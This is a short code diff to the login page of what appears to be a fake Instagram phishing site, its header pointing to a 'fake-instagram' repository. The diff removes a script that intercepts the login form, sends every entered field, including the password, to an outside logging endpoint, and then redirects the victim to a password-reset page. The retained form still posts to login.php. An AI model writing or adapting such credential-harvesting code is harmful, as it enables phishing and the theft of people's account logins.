@@ -9,20 +9,6 @@
 #             ~> https://github.com/AliMilani/fake-instagram/
 -->
 
-<!-- Add this to login.html -->
-<script>
-document.querySelector('form').addEventListener('submit', (e) => {
-    e.preventDefault();
-    const data = new FormData(e.target);
-    fetch('https://your-logging-endpoint.com/log', {
-        method: 'POST',
-        body: JSON.stringify(Object.fromEntries(data))
-    }).then(() => {
-        window.location.href = 'https://example.com/password-reset';
-    });
-});
-</script>
-
 <!-- Modify your form to include proper name attributes -->
 <form method="POST" action="login.php">
     <div class="group">
